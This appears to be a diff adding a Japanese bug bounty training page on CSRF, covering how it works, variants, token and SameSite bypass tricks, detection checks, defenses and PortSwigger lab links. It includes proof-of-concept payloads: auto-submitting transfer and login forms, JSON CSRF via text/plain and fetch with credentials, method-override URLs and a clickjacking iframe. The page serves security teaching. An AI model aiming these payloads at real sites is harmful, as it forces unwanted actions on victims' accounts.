@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF (Cross-Site Request Forgery) - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 1: Core Vulnerabilities &gt; CSRF
+        </div>
+
+        <div class="page-header">
+            <h1>CSRF (Cross-Site Request Forgery)</h1>
+            <p class="subtitle">
+                被害者のブラウザを利用して、本人が意図しないリクエストをターゲットに送信させる。
+                SameSite=Lax デフォルト化で古典的 CSRF は減少傾向だが、バイパス手法は健在。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-wsa">WSA Lab</span>
+                <span class="tag tag-handson">Hands-on</span>
+            </div>
+        </div>
+
+        <!-- 原理 -->
+        <div class="section">
+            <h2>原理と仕組み</h2>
+            <p>
+                ブラウザは同一ドメインへのリクエストに自動的に Cookie を付与する。
+                CSRF はこの仕組みを悪用し、攻撃者のサイトから被害者の認証済みセッションで
+                ターゲットにリクエストを送信させる。
+            </p>
+
+            <div class="mermaid">
+sequenceDiagram
+    participant Attacker as 攻撃者サイト
+    participant Victim as 被害者ブラウザ
+    participant Target as ターゲットサイト
+
+    Note over Victim: 被害者はtarget.comにログイン済み
+    Attacker->>Victim: 罠ページを訪問させる
+    Note over Victim: 自動submit form発火
+    Victim->>Target: POST /transfer (Cookie自動付与)
+    Note over Target: 正規セッションで処理
+    Target->>Victim: 200 OK (送金完了)
+    Note over Attacker: 被害者の意図しない操作が成功
+            </div>
+<pre><code>&lt;!-- 攻撃者のサイトに設置 --&gt;
+&lt;form action="https://bank.com/transfer" method="POST" id="csrf-form"&gt;
+    &lt;input type="hidden" name="to" value="attacker"&gt;
+    &lt;input type="hidden" name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf-form').submit();&lt;/script&gt;
+
+&lt;!-- 被害者がこのページを訪問すると:
+     bank.com への POST が被害者の Cookie 付きで送信される --&gt;</code></pre>
+
+            <div class="callout">
+                <div class="callout-title">CSRF が成立する条件</div>
+                <ul>
+                    <li>Cookie ベースの認証 (セッション Cookie が自動送信される)</li>
+                    <li>CSRF トークンが存在しない or 検証が不十分</li>
+                    <li>SameSite 属性が None or 未設定 (古いブラウザ)</li>
+                    <li>アクションが副作用を持つ (データ変更、設定変更等)</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- 種類 -->
+        <div class="section">
+            <h2>種類と分類</h2>
+
+            <h3>1. Classic CSRF (Form-based)</h3>
+            <p>
+                HTML フォームを利用した基本的な CSRF。POST リクエストで状態変更を実行。
+            </p>
+
+            <h3>2. Login CSRF</h3>
+            <p>
+                被害者を攻撃者のアカウントにログインさせる。その後被害者が入力する情報
+                (クレジットカード、住所等) が攻撃者のアカウントに保存される。
+            </p>
+<pre><code>&lt;form action="https://target.com/login" method="POST"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+    &lt;input type="hidden" name="password" value="attackerpass"&gt;
+&lt;/form&gt;</code></pre>
+
+            <h3>3. JSON CSRF</h3>
+            <p>
+                JSON API に対する CSRF。Content-Type の制限を回避する技術。
+            </p>
+<pre><code>&lt;!-- Content-Type: text/plain で JSON を送信 (Simple Request) --&gt;
+&lt;form action="https://api.target.com/settings" method="POST"
+      enctype="text/plain"&gt;
+    &lt;input name='{"email":"attacker@evil.com","x":"' value='"}' type="hidden"&gt;
+&lt;/form&gt;
+&lt;!-- 送信される body: {"email":"attacker@evil.com","x":"="} --&gt;
+
+&lt;!-- fetch + navigate (Content-Type bypass) --&gt;
+&lt;script&gt;
+fetch('https://api.target.com/settings', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'text/plain'},
+    body: JSON.stringify({email: 'attacker@evil.com'})
+});
+&lt;/script&gt;</code></pre>
+
+            <h3>4. CSRF Token Bypass Techniques</h3>
+<pre><code>// Token 削除: パラメータ自体を除去
+POST /change-email
+email=attacker@evil.com
+(csrf_token パラメータを省略 → サーバーが検証スキップ)
+
+// 別ユーザーの Token 使用
+// サーバーがトークンとセッションを紐付けていない場合
+
+// Token in Cookie (Double Submit)
+// Cookie と body の値が同じかだけ検証
+// → Cookie injection で攻撃者が任意の値をセット可能
+
+// HTTP Method Override
+POST /change-email → GET /change-email?email=x
+(GET にはトークン検証なし)
+_method=GET, X-HTTP-Method-Override: GET</code></pre>
+
+            <h3>5. SameSite Bypass</h3>
+<pre><code>// SameSite=Lax は GET には Cookie を付与する
+// Method Override で GET + 副作用を実現:
+&lt;a href="https://target.com/change-email?email=evil&_method=POST"&gt;Click&lt;/a&gt;
+
+// Open Redirect 経由
+// same-site 内の open redirect を利用:
+https://target.com/redirect?url=https://target.com/change-email?email=evil
+
+// Subdomain からの攻撃
+// SameSite は eTLD+1 で判定
+// sub.target.com に XSS があれば target.com への CSRF 可能
+
+// window.open + Lax (2分ルール)
+// Chrome: Cookie 設定後120秒以内は Lax でも top-level POST で送信
+&lt;script&gt;
+window.open('https://target.com/change-email', '_blank');
+// 新しいタブで top-level navigation → Lax Cookie 付与
+&lt;/script&gt;</code></pre>
+        </div>
+
+        <!-- 検出方法 -->
+        <div class="section">
+            <h2>検出方法</h2>
+            <table>
+                <thead>
+                    <tr><th>チェック項目</th><th>方法</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>CSRF トークンの有無</td><td>フォーム送信時のパラメータ確認</td></tr>
+                    <tr><td>トークン削除テスト</td><td>csrf パラメータを除去して送信</td></tr>
+                    <tr><td>トークン再利用</td><td>古いトークン/別セッションのトークンを使用</td></tr>
+                    <tr><td>SameSite 属性</td><td>Set-Cookie ヘッダーの SameSite 値確認</td></tr>
+                    <tr><td>Content-Type 検証</td><td>application/json を text/plain に変更</td></tr>
+                    <tr><td>Method Override</td><td>POST → GET 変換、_method パラメータ</td></tr>
+                    <tr><td>Referer 検証</td><td>Referer ヘッダー削除/改ざん</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- 防御と Bypass -->
+        <div class="section">
+            <h2>防御と Bypass</h2>
+
+            <h3>Modern CSRF 防御</h3>
+            <ul>
+                <li><strong>SameSite=Strict/Lax</strong> - Chrome 80+ でデフォルト Lax（最大の防御層）</li>
+                <li><strong>CSRF Token (Synchronizer Token Pattern)</strong> - フォームごとにランダムトークン</li>
+                <li><strong>Double Submit Cookie</strong> - Cookie とパラメータの一致検証</li>
+                <li><strong>Origin/Referer 検証</strong> - リクエスト元の確認</li>
+                <li><strong>Custom Header 要求</strong> - X-Requested-With 等 (CORS preflight 必要)</li>
+            </ul>
+
+            <div class="callout warning">
+                <div class="callout-title">SameSite=Lax 時代の CSRF</div>
+                <p>
+                    2020年以降、主要ブラウザは Cookie のデフォルトを <code>SameSite=Lax</code> に変更。
+                    これにより classic CSRF (cross-origin POST) はほぼ死んだ。
+                    しかし以下のケースでは依然として CSRF が可能:
+                </p>
+                <ul>
+                    <li>GET リクエストで副作用があるエンドポイント</li>
+                    <li>SameSite=None が明示的に設定されている API</li>
+                    <li>Same-site 内の XSS/Open Redirect からのチェーン</li>
+                    <li>Method override による GET→POST 変換</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Clickjacking との関連 -->
+        <div class="section">
+            <h2>Clickjacking との関連</h2>
+            <p>
+                Clickjacking は CSRF の「視覚版」とも言える。iframe で透明にターゲットサイトを表示し、
+                被害者に正規のボタンをクリックさせる。
+            </p>
+<pre><code>&lt;!-- Clickjacking PoC --&gt;
+&lt;style&gt;
+iframe { position: absolute; top: 0; left: 0; width: 100%;
+         height: 100%; opacity: 0.0001; z-index: 2; }
+.decoy { position: relative; z-index: 1; }
+&lt;/style&gt;
+&lt;div class="decoy"&gt;&lt;button&gt;Click to win!&lt;/button&gt;&lt;/div&gt;
+&lt;iframe src="https://target.com/delete-account"&gt;&lt;/iframe&gt;</code></pre>
+            <p>
+                防御: <code>X-Frame-Options: DENY</code> or <code>Content-Security-Policy: frame-ancestors 'none'</code>
+            </p>
+        </div>
+
+        <!-- Practice -->
+        <div class="section">
+            <h2>Practice (WSA Labs)</h2>
+            <h3>PortSwigger Web Security Academy</h3>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/csrf/lab-no-defenses" target="_blank">Lab: CSRF vulnerability with no defenses</a></li>
+                <li><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session" target="_blank">Lab: CSRF token not tied to user session</a></li>
+                <li><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override" target="_blank">Lab: SameSite Lax bypass via method override</a></li>
+                <li><a href="https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken" target="_blank">Lab: CSRF with broken Referer validation</a></li>
+                <li><a href="https://portswigger.net/web-security/clickjacking/lab-basic-clickjacking-with-csrf-attack" target="_blank">Lab: Basic clickjacking with CSRF attack</a></li>
+            </ul>
+        </div>
+
+        <!-- Key Takeaways -->
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>SameSite=Lax が主な防御</strong>: だが GET 副作用や same-site XSS で突破可能</li>
+                    <li><strong>Token bypass は系統的に</strong>: 削除、空文字、別セッション、再利用を全試行</li>
+                    <li><strong>JSON API も対象</strong>: Content-Type 検証なければ text/plain で CSRF 可能</li>
+                    <li><strong>Impact を示す</strong>: パスワード変更、メール変更、管理者操作の CSRF は高評価</li>
+                    <li><strong>チェーン価値</strong>: Self-XSS + CSRF、Open Redirect + CSRF で severity 上昇</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- References -->
+        <div class="section">
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/csrf" target="_blank">PortSwigger - CSRF</a></li>
+                <li><a href="https://owasp.org/www-community/attacks/csrf" target="_blank">OWASP - CSRF</a></li>
+                <li><a href="https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery" target="_blank">HackTricks - CSRF</a></li>
+                <li><a href="https://portswigger.net/research/top-10-web-hacking-techniques" target="_blank">PortSwigger Research - SameSite bypass techniques</a></li>
+            </ul>
+        </div>
+
+        <!-- Complete Button -->
+        <div style="text-align:center; margin:2rem 0;">
+            <button class="complete-btn" data-module-id="15-csrf" onclick="toggleComplete('15-csrf')">Mark Complete</button>
+        </div>
+
+        <!-- Page Nav -->
+        <div class="page-nav">
+            <a href="14-auth-bypass.html">&larr; Prev: Auth Bypass</a>
+            <a href="16-file-upload.html">Next: File Upload &rarr;</a>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({startOnLoad:true,theme:'dark',themeVariables:{primaryColor:'#1f2a3f',primaryTextColor:'#e6edf3',primaryBorderColor:'#30363d',lineColor:'#58a6ff',secondaryColor:'#161b22',tertiaryColor:'#161b22'}});</script>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
